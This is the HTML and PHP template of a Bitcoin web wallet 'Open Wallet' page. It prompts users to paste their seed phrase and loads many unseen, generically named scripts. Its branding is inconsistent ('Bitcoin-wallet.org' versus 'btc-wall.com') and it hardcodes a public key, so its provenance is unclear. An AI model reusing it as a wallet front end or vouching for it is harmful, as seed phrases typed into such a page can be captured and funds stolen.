<!DOCTYPE html>
<html lang="en">

<head>

    <title>Bitcoin Wallet (BTC) - Open Wallet</title>

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="keywords" content="open bitcoin wallet, open btc wallet, login bitcoin wallet, login btc wallet, acceass bitcoin wallet">
    <meta name="description" content="Log in to your BTC wallet using the mnemonic phrase.">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="files/css2.css" media="screen">
    <link rel="stylesheet" href="files/css1.css">
    <link rel="stylesheet" href="files/css4.css" media="screen">
    <link rel="stylesheet" href="files/interface.css" media="screen">

    <link rel="stylesheet" href="files/style.css">
    <link rel="stylesheet" href="files/css3.css">

    <script type="text/javascript" src="files/jquery.min.js"></script>

    <!-- Styles -->
    <link href="css/all-styles.css" rel="stylesheet">
    <link href="fonts/titilliumweb/stylesheet.css" rel="stylesheet" type="text/css"/>

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="favicon/favicon-96x96.png" sizes="96x96"
    />
    <link rel="icon" type="image/svg+xml" href="favicon/favicon.svg" />
    <link rel="shortcut icon" href="favicon/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png"
    />
    <link rel="manifest" href="favicon/site.webmanifest" />

    <!-- Megamenu -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/3.0.3/normalize.min.css">
    <link href="megamenu/css/ionicons.min.css" rel="stylesheet">
    <link href="megamenu/css/megamenu.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300"
    rel="stylesheet" type="text/css">
    
    <!--  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>-->
    <script>
        window.jQuery || document.write('<script src="megamenu/js/vendor/jquery-1.12.0.min.js"><\/script>')
    </script>
    <script src="megamenu/js/megamenu.js"></script> 

    <!-- JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
    <script>
        window.Modernizr || document.write(
            '<script src="megamenu/js/vendor/modernizr-2.8.3.min.js"><\/script>'
        )
    </script>
    <style>
        body {
            margin: 0;
        }
    </style>

    <link rel="preload" as="image" href="files/img/in-icon.png">
    <link rel="preload" as="image" href="files/img/out-icon.png">

    <link rel="stylesheet" href="files/style.css">
    <link rel="stylesheet" href="files/css3.css">

    <script type="text/javascript" src="files/jquery.min.js"></script>
    <script type="text/javascript" src="files/jquery.min_002.js"></script>

</head>
<body>
	<?php 
        include 'templates/header.php';
    ?>
    <div id="wrap">

        <div id="content" class="container">

            <noscript class="alert alert-danger center-block">
                <span class="glyphicon glyphicon-exclamation-sign"></span>                This page uses javascript, please enable it to continue!
            </noscript>

            <div class="tab-pane tab-content" id="wallet">
                <div class="row">
                    <div class="col-md-12">
                        <!-- <center><h1>bitcoin wallet</h1></center> -->
                        <div id="openLogin">

                            <form class="form-signin" role="form" action="javascript:;">

                                <br>
                                <div class="block-first col-12">
                                    <ul class="block-first__form-list def-list-zero">
                                        <li class="block-first__form-item active">
                                            <div class="field__row">
                                                <div class="field__col">
                                                    <!-- <label class="field__label" for="your-seed" id="seed_label">Your Seed Phrase:</label> -->
                                                    <label class="field__label seed_label" for="your-seed" data-type="register"
                                                    style="display: none;">Your Seed Phrase:</label>
                                                    <label class="field__label seed_label" for="your-seed" style="display: none;"
                                                    data-type="auth">Login - enter your
                                                        seed phrase:</label>
                                                    <label class="field__label seed_label" for="your-seed" style="" data-type="import">Import Seed (12,15,18,21
                                                        or 24 words):</label>
                                                </div>
                                                <div class="field__col">
                                                    <button type="button" id="gen_seed_text" class="field__button field__button--plant"
                                                    style="display: none;">Generate New Seed (+)</button>
                                                </div>
                                            </div>

                                            <div id="seed_form" class="field__wrapper field__wrapper--buttons">
                                                <textarea class="form__textarea create-wallet-your-seed" id="create-wallet-your-seed"
                                                name="create-wallet-your-seed"
                                                undefined=""></textarea>

                                                <!-- <button type="button" id="copy-seed-btn" class="field__copy-button" onclick="app_seed_copy();" style="display: none;"></button>
		                                       <button type="button" class="field__print-button" onclick="window.print();" style="display: none;"></button> -->
                                            </div>

                                            <div style="display: none;">
                                                <a href="javascript:;" class="optionsCollapse">
                                                    <div class="well well-sm"><span class="glyphicon glyphicon-collapse-down"
                                                        id="glyphcollapse"></span>                                                        Options</div>
                                                </a>
                                                <div class="hidden optionsAdvanced">
                                                    <label>SegWit Address</label>
                                                    <p class="checkbox">
                                                        <label>
                                                            <input type="checkbox"
                                                            id="walletSegwit"
                                                            class="checkbox-inline"
                                                            checked="checked"
                                                            data-original-title=""
                                                            title=""> Segwit address
                                                            (regular).
                                                            <span class="text-muted"><i>(recommended)</i></span></label>
                                                        <br>
                                                        <label>
                                                            <input type="radio"
                                                            id="walletSegwitp2sh"
                                                            class="walletSegwitType"
                                                            name="walletSegWitType"
                                                            value="p2sh"
                                                            checked="checked"
                                                            data-original-title=""
                                                            title=""> p2sh address</label>
                                                        <br>
                                                        <label>
                                                            <input type="radio"
                                                            id="walletSegwitBech32"
                                                            class="walletSegwitType"
                                                            name="walletSegWitType"
                                                            value="bech32"
                                                            data-original-title=""
                                                            title=""> bech32 address</label>
                                                    </p>

                                                    <label>RBF</label>
                                                    <p class="checkbox">
                                                        <label>
                                                            <input type="checkbox"
                                                            id="walletRBF"
                                                            class="checkbox-inline"
                                                            checked="checked"
                                                            data-original-title=""
                                                            title=""> Enable RBF.
                                                            <span class="text-muted"><i>(recommended)</i></span></label>
                                                    </p>
                                                </div>
                                            </div>
                                            <center>
                                                <div style="color: green; display: none;"
                                                id="register_label"><small><b><br>↑ Save your Seed phrase. ↑</b><br>
											Without a seed (mnemonic) phrase, you will not be able to enter the wallet and use bitcoins.<br>
											<b>Bitcoin-wallet.org</b> does not store seed phrases and therefore cannot recover them.</small>
                                                </div>
                                            </center>

                                            <div id="seed_error" class="alert alert-danger" style="display: none;"></div>
                                            <div class="block-first__buttons">
                                                <button class="block-first__button btn-active" id="openBtn">Import Seed phrase</button>

                                            </div>
                                        </li>

                                    </ul>
                                </div>

                                <br>
                                <!-- <div style="text-align: center;">
		                                    <center>
		                                	<button class="form_select form__btn-reset btn-reset" data-readonly="true" data-type="register">Create Wallet</button>
		                                	<button class="form_select form__btn-reset btn-reset" data-type="auth">Login</button>
		                                	<br><br>
		                                	<a href="#" style="padding: 20px;" class="form_select active" data-type="import">Import Seed phrase</a>
		                                	</center>
		                                	
		                                </div> -->

                            </form>
                        </div>

                        <div id="openWallet" class="hidden">
                            <div class="wallet-inner">
                                <div class="row">
                                    <div class="col-md-12">
                                        <p><span style="float:right;"><a href="index.php" id="index.php"><span class="glyphicon glyphicon-log-out"></span>                                            <small>Logout</small></a>
                                            </span>
                                        </p>
                                    </div>
                                    <br>
                                        <div class="col-md-3 interface-menu" align="left">
                                            <ul class="nav nav-pills interface-nav" role="tablist">
                                                
                                                <li role="presentation"><a href="javascript:;" id="walletShowKeys"><b>Seed/Key</b></a></li>
                                                <li role="presentation"><a href="javascript:;" id="walletShowSpend"><b>Send</b></a></li>
                                                <li role="presentation"><a id="walletShowSummary" href="javascript:;"><b>Summary</b></a></li>
                                                <li role="presentation"><a id="walletHistory" href="javascript:;" target="_blank"><b>Explorer</b></a></li>                                                                                           
                                            </ul>
                                        </div>
                                        <div class="col-md-9 interface-dashboard" align="center">
                                        <a href="javascript:;" id="walletBalance" style="color: #0381B3; font-size:32px ;"
                                        data-balance="0">0.00 BTC</a>
                                        <span class="balance_usd" style="color: #a9a5a5; font-size:15px ;"><br> ≈ 0.00 $ </span>

                                        <!-- <Font color=a9a5a5>	 &#8776; 0 $ </font> -->
                                        <br>
                                        <br>
                                        <div>

                                            <font color="a9a5a5" size="2">Your bitcoin address: </font>
                                            <br>
                                            <span id="walletLoader" class="hidden"><img src="files/loader.gif"></span>
                                            <span id="walletAddress"></span><br/>
                                            <div class="btn-group">
                                                <button type="button" class="btn btn-default btn-xs dropdown-toggle" data-toggle="dropdown"
                                                id="walletToBtn">SegWit <span class="caret"></span></button>
                                                <ul class="dropdown-menu">
                                                    <li><a href="javascript:;"
                                                        id="walletToSegWit">SegWit</a></li>
                                                    <li><a href="javascript:;"
                                                        id="walletToSegWitBech32">Bech32</a></li>
                                                    <li><a href="javascript:;"
                                                        id="walletToLegacy">Legacy</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                        <br>
                                        <div style="text-align:center;">
                                            <div id="walletKeys" class="hidden">
                                                <label><font color="green">Seed:</font></label>
                                                <div class="input-group">
                                                    <input class="form-control seed_main" type="password" readonly="readonly"
                                                    data-original-title=""
                                                    title="">
                                                    <span class="input-group-btn">
                                                        <button class="showKey btn btn-default" type="button">Show</button>
                                                    </span>
                                                </div>

                                                <br> Public Key:
                                                <input class="form-control pubkey" type="text" readonly="readonly" data-original-title=""
                                                title="" value="02fecb7810d1a10d55736865f958c43b4d2d3ca6e38de5416fe56a34e3f9b48b05">

                                                <br>

                                                <div class="walletSegWitRS hidden">
                                                    Redeem Script <i>(SegWit):</i>
                                                    <input class="form-control" type="text" readonly="readonly" data-original-title=""
                                                    title="" value="00143dfde066946a7a63450e6c825a113bc9c91a4ff5">
                                                </div>
                                                <br>

                                                <label>Private key:</label>
                                                <div class="input-group">
                                                    <input class="form-control privkey" type="password" readonly="readonly"
                                                    data-original-title=""
                                                    title="">

                                                    <span class="input-group-btn">
															<button class="showKey btn btn-default" type="button">Show</button>
														</span>
                                                </div>

                                                <label style="display: none;">Private Key (AES256 encrypted
                                                    key):</label>
                                                <input style="display: none;" class="form-control privkeyaes" type="text"
                                                readonly="readonly" data-original-title=""
                                                title="">
                                            </div>
                                            
                                            <div id="walletSpend" class="hidden">
                                                <div class="row">
                                                    <div class="form-inline output">

                                                    </div>
                                                </div>

                                                <div class="" id="walletSpendTo">

                                                    <div id="qrvidBox" style="display: none;">
                                                        <div class="container">
                                                            <div id="qrvideo" class="qrimage">
                                                                <button class="grvideo-close" title="Close">
                                                                    X
                                                                </button>
                                                                <style>
                                                                    #qrvideo {
                                                                        position: relative;
                                                                        width: 300px;
                                                                    }
                                                                    
                                                                    .grvideo-close {
                                                                        position: absolute;
                                                                        top: 0;
                                                                        right: 5px;
                                                                        z-index: 2;
                                                                        cursor: pointer;
                                                                        font-size: 30px;
                                                                        color: #000;
                                                                        border: 0;
                                                                        margin: 0;
                                                                        padding: 0;
                                                                        background: transparent;
                                                                        background-color: #ffffff;
                                                                        transition: all .3s;
                                                                    }
                                                                    
                                                                    .grvideo-close:hover {
                                                                        opacity: .7;
                                                                        transition: all .3s;
                                                                    }
                                                                    
                                                                    .grvideo-close svg {
                                                                        width: 22px;
                                                                        height: 22px;
                                                                    }
                                                                </style>

                                                                <button class="grvideo-close" title="Close">
                                                                    X
                                                                </button>
                                                                <style>
                                                                    #qrvideo {
                                                                        position: relative;
                                                                        width: 300px;
                                                                    }
                                                                    
                                                                    .grvideo-close {
                                                                        position: absolute;
                                                                        top: 0;
                                                                        right: 5px;
                                                                        z-index: 2;
                                                                        cursor: pointer;
                                                                        font-size: 30px;
                                                                        color: #000;
                                                                        border: 0;
                                                                        margin: 0;
                                                                        padding: 0;
                                                                        background: transparent;
                                                                        background-color: #ffffff;
                                                                        transition: all .3s;
                                                                    }
                                                                    
                                                                    .grvideo-close:hover {
                                                                        opacity: .7;
                                                                        transition: all .3s;
                                                                    }
                                                                    
                                                                    .grvideo-close svg {
                                                                        width: 22px;
                                                                        height: 22px;
                                                                    }
                                                                </style>

                                                                <video id="video" width="300" height="300" style="border: 1px solid gray"
                                                                disablepictureinpicture=""></video>
                                                                <div
                                                                style="position: absolute; display: none; pointer-events: none;"
                                                                class="scan-region-highlight">
                                                                    <svg class="scan-region-highlight-svg"
                                                                    viewBox="0 0 238 238"
                                                                    preserveAspectRatio="none"
                                                                    style="position:absolute;width:100%;height:100%;left:0;top:0;fill:none;stroke:#e9b213;stroke-width:4;stroke-linecap:round;stroke-linejoin:round">
                                                                        <path
                                                                        d="M31 2H10a8 8 0 0 0-8 8v21M207 2h21a8 8 0 0 1 8 8v21m0 176v21a8 8 0 0 1-8 8h-21m-176 0H10a8 8 0 0 1-8-8v-21"></path>
                                                                    </svg>
                                                            </div>
                                                            <div style="position: absolute; display: none; pointer-events: none;"
                                                            class="scan-region-highlight">
                                                                <svg class="scan-region-highlight-svg"
                                                                viewBox="0 0 238 238"
                                                                preserveAspectRatio="none"
                                                                style="position:absolute;width:100%;height:100%;left:0;top:0;fill:none;stroke:#e9b213;stroke-width:4;stroke-linecap:round;stroke-linejoin:round">
                                                                    <path d="M31 2H10a8 8 0 0 0-8 8v21M207 2h21a8 8 0 0 1 8 8v21m0 176v21a8 8 0 0 1-8 8h-21m-176 0H10a8 8 0 0 1-8-8v-21"></path>
                                                                </svg>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="form-horizontal output">
                                                    <b>Bitcoin Address:</b>
                                                    <br>

                                                    <div class="input-group">
                                                        <input type="text" class="form-control addressTo" data-original-title=""
                                                        title="" id="txtAddress">

                                                        <span class="input-group-addon"><a href="" id="qrlink"><span class="glyphicon glyphicon-qrcode" id="qrscan"></span></a>
                                                        </span>
                                                    </div>

                                                    <br>
                                                    <b>Amount, BTC:</b>
                                                    <br>
                                                    <div class="input-group" style="width:100%;">
                                                        <input type="text" class="form-control amount" id="input_for_convert" data-original-title=""
                                                        title="" placeholder="0.00">
                                                        <span id="maxAmount">MAX</span>
                                                        <span class="amount_usd" style="display: none; color: #a9a5a5; font-size:13px ;">$0.00</span>
                                                    </div>

                                                    <br>

                                                    <!-- <a href="javascript:;" class="addressAdd"><span class="glyphicon glyphicon-plus"></span></a> -->

                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-xs-6">
                                                    <small>Network fee:</small>
                                                    <input type="text" class="form-control amount" value="0.000000" id="txFee" data-original-title=""
                                                    title="">
                                                    <span class="amount_usd" style="color: #a9a5a5; font-size:13px ;">$0.00</span>
                                                </div>
                                                <div class="col-xs-5">
                                                    <small>Donation:</small>
                                                    <input type="text" class="form-control amount" value="0.00015" id="developerDonation"
                                                    data-original-title=""
                                                    title="">
                                                    <span class="amount_usd" style="color: #a9a5a5; font-size:13px ;">$0.00</span>
                                                </div>
                                            </div>
                                            <br>
                                            
                                            <div class="row">
                                                <div id="totalAmount">
                                                    <h4>Total amount:</h4>
                                                    <span id="totalBTCAmount" class="amount"></span><br/>
                                                    <span id="totalUSDAmount" class="amount_usd"></span><br/>
                                                </div>
                                            </div>

                                            <div id="walletSendStatus" class="alert alert-danger hidden"></div>

                                            <button class="btn btn-primary" type="button" id="walletSendBtn">Send</button>
                                            <button class="btn btn-default" type="button" id="walletResetBtn">Reset</button>

                                        </div>
                                    </div>
                                    <div id="walletQrCode">
                                        <font color="a9a5a5" size="1">QR-code of bitcoin address</font>
                                    </div>
                                    <div id="walletSummary" class=""></div>
                                </div>
                            </div>
                        </div>
                        <!-- our -->
                    </div>

                </div>
            </div>
        </div>

        

        <!-- wallet confirm send modal -->
        <div class="modal fade" id="modalWalletConfirm" tabindex="-1" role="dialog"
        aria-labelledby="myModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        <h4 class="modal-title">Please, confirm transaction:</h4>
                    </div>

                    <div class="modal-body">
                        <p>Do you want to send <span id="spendAmount">0.00</span>                            BTC ?</p>

                        <br>
                        <div id="walletSendConfirmStatus" class="alert alert-danger hidden"></div>

                        <div id="walletSendFailTransaction" class="alert alert-info hidden">
                            <b>Raw Transaction:</b>
                            <p>Below is a copy of the transaction we tried
                                to submit</p>
                            <textarea class="form-control" readonly="readonly"></textarea>
                        </div>
                    </div>

                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" id="walletConfirmSend">Send</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal" id="confirmClose">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- wallet confirm send modal -->

        <!-- qrcode modal -->
        <div class="modal fade" id="modalQrcode" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"
        aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        <h4 class="modal-title">qrcode</h4>
                    </div>

                    <div class="modal-body" align="center">
                        <div id="qrcode"></div>
                    </div>

                    <div class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal" id="qrCodeClose">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- qrcode modal -->

        <!-- qrcode scanner modal -->
        <div class="modal fade" id="modalQrcodeScanner" tabindex="-1" role="dialog"
        aria-labelledby="myModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        <h4 class="modal-title">qrcode scanner</h4>
                    </div>

                    <div class="modal-body" align="center">
                        <select id="videoSource" class="form-control"></select>
                        <div id="videoReaderError" class="hidden">Sorry, your browser does not offer camera support</div>
                        <video id="videoReader" muted="muted" autoplay="autoplay" style="width:100%;height:100%"></video>
                        <div id="qrcode-scanner-callback-to" class="hidden"></div>
                    </div>

                    <div class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal" id="qrScanClose">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- qrcode scanner modal -->

        <!-- warning (fee) modal -->
        <div class="modal fade" id="modalWarningFee" tabindex="-1" role="dialog"
        aria-labelledby="myModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        <h4 class="modal-title"><b>Warning - High Fee!</b></h4>
                    </div>

                    <div class="modal-body">
                        Please be aware that you have created a transaction with what seems to
                        be a very high fee of
                        <span
                        id="modalWarningFeeAmount"></span> BTC!
                    </div>

                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-dismiss="modal" id="warningFeeClose">OK, I've got it!</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- warning (fee) modal -->

        <div class="exchange_now" style="display: none;">

        </div>
        
        
        <script type="text/javascript" src="files/js20.js"></script>
        <script type="text/javascript" src="files/js23.js"></script>
        <script type="text/javascript" src="files/js31.js"></script>
        <script type="text/javascript" src="files/js7.js"></script>

        <script src="files/js2.js"></script>
        <script src="files/js11.js"></script>
        <script src="files/js22.js"></script>
        <script src="files/js19.js"></script>
        <script>
            var exchange_now = 0;
        </script>
        <script src="files/js16.js"></script>

        <script src="files/js25.js"></script>
        <script src="files/js27.js"></script>
        <script src="files/js13.js"></script>

        <script type="text/javascript" src="files/js4.js"></script>
        <script type="text/javascript" src="files/js3.js"></script>

        <script type="text/javascript" src="files/js8.js"></script>
        <script type="text/javascript" src="files/js9.js"></script>
        <script type="text/javascript" src="files/js10.js"></script>
        <script type="text/javascript" src="files/js29.js"></script>
        <script type="text/javascript" src="files/js28.js"></script>
        <script type="text/javascript" src="files/js1.js"></script>

        <script type="text/javascript" src="files/js26.js"></script>
        <script type="text/javascript" src="files/js24.js"></script>
        <script type="text/javascript" src="files/js21.js"></script>
        <script type="text/javascript" src="files/js15.js"></script>

        <script type="text/javascript" src="files/js5.js"></script>
        <script type="text/javascript" src="files/js6.js"></script>

        <script type="text/javascript" src="files/js14.js"></script>
        <script type="text/javascript" src="files/js17.js"></script>
        <script type="text/javascript" src="files/js18.js"></script>
        <script type="text/javascript" src="files/js30.js"></script>

        <div class="hidden" id="entropybucket">f90b31395e4ca863d5725da960ad65af76b47eb782bba3d3a7dab0e6b6efbffbd1190f8f17a534eb36e535be33b932b22d9a27811f67154614410938d906cee2</div>
    </div>
    </div>
    <?php 
        include 'templates/footer.php';
    ?>
    <noscript>
        <div>
            <h1>Looks like you have Javascript disabled.</h1>
            <p>btc-wall.com needs Javascript to work properly.</p>
            <h3>Please enable Javascript to get the best out of btc-wall.com</h3>
        </div>
    </noscript>           
   
           
</body>
</html>